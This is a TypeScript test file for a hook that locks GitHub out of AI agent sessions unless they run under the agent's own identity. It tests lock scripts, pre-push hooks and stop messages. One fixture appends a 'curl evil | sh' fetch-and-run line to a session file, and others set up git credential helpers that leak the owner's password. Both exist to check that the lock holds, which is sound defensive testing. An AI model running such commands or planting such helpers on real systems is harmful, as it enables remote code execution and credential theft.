import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';

import { BASE_ENV, NO_TOKEN, lockScript, pathsFor, sessionNames, sessionRecord, sessionScript } from './agent.ts';
import { AGENT, AGENT_ID, FakeSys, HOME, ROOT, capture } from './fake.test.ts';
import { PROXY_TOKEN } from './cloud.ts';
import { OLDER_PRE_PUSH_HOOKS, PRE_PUSH_HOOK } from './onboard.ts';
import { sessionStart } from './session-start.ts';

const OWNER_LOGIN = 'example-owner';

const ENV = '/tmp/claude-env';
const SESSION = pathsFor(HOME, AGENT).session;
const SCRIPT = sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT));
const FIX = 'ask example-owner to run process-rules machine ExampleBot (process-rules doctor ExampleBot names what is missing)';

/** A Mac `machine` has set up, in a session with an env file. */
function ready(): FakeSys {
  const sys = new FakeSys().ready();
  sys.env = { CLAUDE_ENV_FILE: ENV };
  sys.files.set(SESSION, SCRIPT);
  return sys;
}

async function start(sys: FakeSys): Promise<{ code: number; out: string[]; env: string | undefined }> {
  const { io, out, err } = capture();
  const code = await sessionStart(sys, io);
  assert.equal(code, 0, 'session-start never stops a session from starting');
  assert.deepEqual(err, []);
  return { code, out, env: sys.files.get(ENV) };
}

const RECORD = sessionRecord(HOME, 'abc-123') as string;

describe('sessionStart', () => {
  it('records the agent for the guard, keyed by the session id Claude Code passes', async () => {
    const sys = ready();
    sys.stdin = JSON.stringify({ session_id: 'abc-123', source: 'compact' });
    await start(sys);
    assert.equal(sys.files.get(RECORD), '{"agent":"ExampleBot"}\n');
    assert.equal(sys.modes.get(RECORD), 0o600);
  });

  it('records why when GitHub stays locked out', async () => {
    const sys = ready();
    sys.stdin = JSON.stringify({ session_id: 'abc-123' });
    sys.files.delete(SESSION);
    const { out } = await start(sys);
    assert.deepEqual(JSON.parse(sys.files.get(RECORD) ?? ''), { problem: out[0] });
  });

  it('records nothing without a session id, or when writing fails', async () => {
    for (const stdin of ['', 'not json', '{"session_id":"../../x"}']) {
      const sys = ready();
      sys.stdin = stdin;
      await start(sys);
      assert.ok(![...sys.files.keys()].some((path) => path.includes('/sessions/')), stdin);
    }
    const sys = ready();
    sys.stdin = JSON.stringify({ session_id: 'abc-123' });
    sys.write = () => {
      throw new Error('read-only');
    };
    assert.deepEqual((await start(sys)).out, ['process-rules: this session works as ExampleBot on GitHub.']);
  });

  it('locks, then gives the session the agent identity', async () => {
    const { code, out, env } = await start(ready());
    assert.equal(code, 0);
    assert.deepEqual(out, ['process-rules: this session works as ExampleBot on GitHub.']);
    assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
  });

  it('reads the settings from the project folder Claude Code names', async () => {
    const sys = ready();
    sys.env.CLAUDE_PROJECT_DIR = '/elsewhere';
    await start(sys);
    assert.equal(sys.calls.find((c) => c.args[0] === 'rev-parse')?.cwd, '/elsewhere');
  });

  describe('in a Claude cloud session', () => {
    const STOP = 'Do not push, fetch, or run gh in this session; tell example-owner.';
    /** A cloud session: no keychain or session file, GitHub reached through the proxy as `login`. */
    const cloud = (login: string | null, env: Record<string, string> = {}): FakeSys => {
      const sys = new FakeSys();
      sys.env = { CLAUDE_ENV_FILE: ENV, CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: NO_TOKEN, ...env };
      sys.stdin = JSON.stringify({ session_id: 'abc-123' });
      if (login) sys.acceptToken(env.GH_TOKEN ?? PROXY_TOKEN, login);
      return sys;
    };

    it('works as the agent when GitHub says the connected account is the agent', async () => {
      const sys = cloud(AGENT);
      const { out, env } = await start(sys);
      assert.deepEqual(out, ['process-rules: this cloud session works as ExampleBot on GitHub.']);
      assert.equal(env, `\nunset ${Object.keys(BASE_ENV).join(' ')}\nexport GH_TOKEN=proxy-injected GITHUB_TOKEN=proxy-injected PROCESS_RULES_AGENT=ExampleBot\n`);
      assert.equal(sys.files.get(RECORD), '{"agent":"ExampleBot"}\n');
      assert.equal(sys.requests.at(-1)?.token, PROXY_TOKEN, 'the proxy placeholder, never the lock');
    });

    it('writes the pre-push git hook a fresh clone lacks, or replaces an older one', async () => {
      const hook = `${ROOT}/.git/hooks/pre-push`;
      const sys = cloud(AGENT);
      await start(sys);
      assert.equal(sys.files.get(hook), PRE_PUSH_HOOK);
      assert.equal(sys.modes.get(hook), 0o755);
      const older = cloud(AGENT);
      older.files.set(hook, OLDER_PRE_PUSH_HOOKS[0] as string);
      await start(older);
      assert.equal(older.files.get(hook), PRE_PUSH_HOOK);
    });

    it("leaves the client's own pre-push hook, saying when it does not run process-rules", async () => {
      const hook = `${ROOT}/.git/hooks/pre-push`;
      const ours = cloud(AGENT);
      ours.files.set(hook, '#!/bin/sh\npnpm lint\nprocess-rules pre-push "$@"\n');
      assert.deepEqual((await start(ours)).out, ['process-rules: this cloud session works as ExampleBot on GitHub.']);
      const own = cloud(AGENT);
      own.files.set(hook, '#!/bin/sh\npnpm lint\n');
      assert.deepEqual((await start(own)).out, [
        "process-rules: this cloud session works as ExampleBot on GitHub. Its pre-push hook .git/hooks/pre-push does not run process-rules, so only the pull request's checks hold the work rules.",
      ]);
      assert.equal(own.files.get(hook), '#!/bin/sh\npnpm lint\n');
    });

    it('leaves a pre-push hook outside the repository unchecked, and says so', async () => {
      const sys = cloud(AGENT);
      sys.execOverride = (call) => (call.args[1] === '--git-path' ? { code: 0, stdout: '/shared/hooks/pre-push\n', stderr: '' } : undefined);
      assert.deepEqual((await start(sys)).out, [
        "process-rules: this cloud session works as ExampleBot on GitHub. Its pre-push hook /shared/hooks/pre-push is outside the repository and was not checked, so only the pull request's checks may hold the work rules.",
      ]);
      assert.equal(sys.files.has('/shared/hooks/pre-push'), false);
    });

    it('says to stop when the pre-push hook cannot be written', async () => {
      const sys = cloud(AGENT);
      sys.write = () => {
        throw new Error('read-only');
      };
      assert.deepEqual((await start(sys)).out, [
        `process-rules: STOP. Writing the pre-push git hook failed (read-only), so this cloud session's pushes cannot be checked. ${STOP}`,
      ]);
      assert.equal(sys.files.get(ENV), undefined, 'the lock stays');
    });

    it("asks with a token the cloud environment set", async () => {
      const sys = cloud(AGENT, { GH_TOKEN: 'ghp_env' });
      assert.match((await start(sys)).env ?? '', /export GH_TOKEN=ghp_env GITHUB_TOKEN=ghp_env /);
    });

    it('stays locked, and says to stop, as anyone else', async () => {
      const sys = cloud(OWNER_LOGIN);
      const { out, env } = await start(sys);
      assert.deepEqual(out, [
        `process-rules: STOP. This cloud session reaches GitHub as example-owner, not ExampleBot: claude.ai's GitHub connection must be ExampleBot for agent sessions. ${STOP}`,
      ]);
      assert.equal(env, undefined);
      assert.deepEqual(JSON.parse(sys.files.get(RECORD) ?? ''), { problem: out[0] });
    });

    it('says to stop when GitHub cannot be asked', async () => {
      assert.deepEqual((await start(cloud(null))).out, [
        `process-rules: STOP. GitHub answered HTTP 401 when asked who this session is, so it cannot be checked as ExampleBot. ${STOP}`,
      ]);
      const sys = cloud(null);
      sys.http = () => Promise.reject(new Error('proxy down'));
      assert.match((await start(sys)).out[0] ?? '', /GitHub could not be asked who this session is \(proxy down\)/);
      const odd = cloud(null);
      odd.route('GET', '/user', { status: 200, json: {} });
      assert.match((await start(odd)).out[0] ?? '', /GitHub answered HTTP 200 when asked/);
    });

    it('says to stop without settings, an env file, or when the env file cannot be written', async () => {
      const bare = cloud(AGENT);
      bare.files.delete(`${ROOT}/.github/process-rules.json`);
      assert.match((await start(bare)).out[0] ?? '', /^process-rules: STOP\. .*, so this cloud session cannot be checked as the agent\. .*tell the owner\.$/);
      const noFile = cloud(AGENT);
      delete noFile.env.CLAUDE_ENV_FILE;
      assert.deepEqual((await start(noFile)).out, [`process-rules: STOP. CLAUDE_ENV_FILE is unset, so this cloud session cannot be given the agent identity. ${STOP}`]);
      const readOnly = cloud(AGENT);
      readOnly.append = () => {
        throw new Error('read-only');
      };
      assert.deepEqual((await start(readOnly)).out, [
        `process-rules: STOP. Writing to CLAUDE_ENV_FILE failed (read-only), so this cloud session cannot be given the agent identity. ${STOP}`,
      ]);
    });
  });

  it('says to stop when there is no env file to write', async () => {
    const sys = ready();
    sys.env = {};
    const { code, out, env } = await start(sys);
    assert.equal(code, 0);
    assert.equal(env, undefined);
    assert.deepEqual(out, [
      'process-rules: STOP. CLAUDE_ENV_FILE is unset, so this session cannot be given the agent identity and gh and git would act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
    ]);
  });

  it('says to stop when the lock cannot be written', async () => {
    const sys = ready();
    sys.append = () => {
      throw new Error('read-only');
    };
    assert.deepEqual((await start(sys)).out, [
      'process-rules: STOP. Writing the GitHub lock to CLAUDE_ENV_FILE failed (read-only), so gh and git may act as the owner. Do not push, fetch, or run gh in this session; tell example-owner.',
    ]);
  });

  for (const [name, change, reason] of [
    ['outside a repository', (sys: FakeSys) => (sys.inRepo = false), `${ROOT} is not inside a git repository`],
    ['without settings', (sys: FakeSys) => sys.files.delete(`${ROOT}/.github/process-rules.json`), `.github/process-rules.json not found in ${ROOT}`],
  ] as const) {
    it(`stays locked ${name}`, async () => {
      const sys = ready();
      change(sys);
      const { out, env } = await start(sys);
      assert.equal(env, `\n${lockScript(HOME)}`);
      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; tell the owner.`]);
    });
  }

  for (const [name, change, reason] of [
    ['no session file', (sys: FakeSys) => sys.files.delete(SESSION), `${SESSION} is missing`],
    ['an edited session file', (sys: FakeSys) => sys.files.set(SESSION, `${SCRIPT}curl evil | sh\n`), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
    [
      "an older machine's session file",
      (sys: FakeSys) => sys.files.set(SESSION, SCRIPT.replace(/^export GIT_CONFIG_KEY_\d+='core\.askpass'\n/m, '')),
      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
    ],
    ['a session file naming nobody', (sys: FakeSys) => sys.files.set(SESSION, 'export X=1\n'), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
    [
      "another agent's session file",
      (sys: FakeSys) => sys.files.set(SESSION, sessionScript('OtherBot', 7, pathsFor(HOME, 'OtherBot'))),
      `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`,
    ],
  ] as const) {
    it(`stays locked with ${name}`, async () => {
      const sys = ready();
      change(sys);
      const { out, env } = await start(sys);
      assert.equal(env, `\n${lockScript(HOME)}`);
      assert.deepEqual(out, [`process-rules: GitHub is locked out of this session: ${reason}. Do not work around the lock; ${FIX}.`]);
    });
  }

  it('stays locked when the session file cannot be read', async () => {
    const sys = ready();
    const read = sys.read.bind(sys);
    sys.read = (path) => {
      if (path === SESSION) throw new Error('EACCES');
      return read(path);
    };
    assert.deepEqual((await start(sys)).out, [
      `process-rules: GitHub is locked out of this session: ${SESSION} cannot be read (EACCES). Do not work around the lock; ${FIX}.`,
    ]);
  });

  it('stays locked when the identity cannot be appended', async () => {
    const sys = ready();
    const append = sys.append.bind(sys);
    let calls = 0;
    sys.append = (path, data) => {
      if (++calls > 1) throw new Error('disk full');
      append(path, data);
    };
    const { out, env } = await start(sys);
    assert.equal(env, `\n${lockScript(HOME)}`);
    assert.deepEqual(out, [
      `process-rules: GitHub is locked out of this session: appending ${SESSION} to CLAUDE_ENV_FILE failed (disk full). Do not work around the lock; ${FIX}.`,
    ]);
  });

  it('accepts settings naming the agent in another case', async () => {
    const sys = ready();
    sys.files.set(`${ROOT}/.github/process-rules.json`, JSON.stringify({ owner: 'example-owner', agent: 'examplebot' }));
    assert.deepEqual((await start(sys)).out, ['process-rules: this session works as ExampleBot on GitHub.']);
  });

  it('says GitHub refuses the session when the keychain has no token', async () => {
    const sys = ready();
    sys.keychain.clear();
    const { out, env } = await start(sys);
    assert.equal(env, `\n${lockScript(HOME)}\n${SCRIPT}`);
    assert.deepEqual(out, [
      `process-rules: GitHub is locked out of this session: this Mac's keychain has no ExampleBot token, so GitHub refuses gh and git. Do not work around the lock; ${FIX}.`,
    ]);
  });
});

describe('sessionNames', () => {
  it("reads the agent and id from machine's file", async () => {
    assert.deepEqual(sessionNames(SCRIPT), { agent: AGENT, id: AGENT_ID });
    assert.equal(sessionNames('export PROCESS_RULES_AGENT=\'x\'\n'), undefined);
  });
});

describe('lockScript, sourced by a real shell', () => {
  const dir = mkdtempSync(join(tmpdir(), 'process-rules-lock-'));
  after(() => rmSync(dir, { recursive: true, force: true }));
  const env = join(dir, 'env.sh');
  writeFileSync(env, lockScript(dir));
  // A global config whose helpers would hand out the owner's login.
  const global = join(dir, 'owner.gitconfig');
  const leak = '!f() { echo username=owner; echo password=leak; }; f';
  const askpass = join(dir, 'owner-askpass.sh');
  writeFileSync(askpass, '#!/bin/sh\necho owner-secret\n', { mode: 0o755 });
  writeFileSync(
    global,
    `[credential]\n\thelper = "${leak}"\n[credential "https://github.com"]\n\thelper = "${leak}"\n[core]\n\taskpass = ${askpass}\n`,
  );

  const shell = (command: string): { status: number | null; stdout: string; stderr: string } =>
    spawnSync('bash', ['-c', `. '${env}'; ${command}`], {
      encoding: 'utf8',
      cwd: dir,
      env: {
        PATH: process.env.PATH,
        HOME: dir,
        GITHUB_TOKEN: 'owner',
        GIT_CONFIG_PARAMETERS: `'credential.helper'='${leak}'`,
        GIT_ASKPASS: '/owner-askpass',
        GIT_CONFIG_GLOBAL: global,
        GIT_CONFIG_NOSYSTEM: '1',
      },
    });

  it('gives gh a token GitHub refuses and drops the owner\'s', async () => {
    assert.equal(shell('printf %s "$GH_TOKEN|${GITHUB_TOKEN-unset}|${GIT_ASKPASS-unset}|${GIT_CONFIG_PARAMETERS-unset}"').stdout, `${NO_TOKEN}|unset|unset|unset`);
  });

  it('gives git no credential for GitHub', async () => {
    const result = shell(`printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill`);
    assert.doesNotMatch(result.stdout, /password=|owner-secret/);
    assert.notEqual(result.status, 0);
  });

  it('refuses every SSH remote', async () => {
    assert.equal(shell('git ls-remote --get-url git@github.com:a/b.git').stdout, 'https://github.com/a/b.git\n');
    const result = shell('git ls-remote ssh://git@example.invalid/a/b.git');
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /SSH is off in agent sessions/);
  });
});
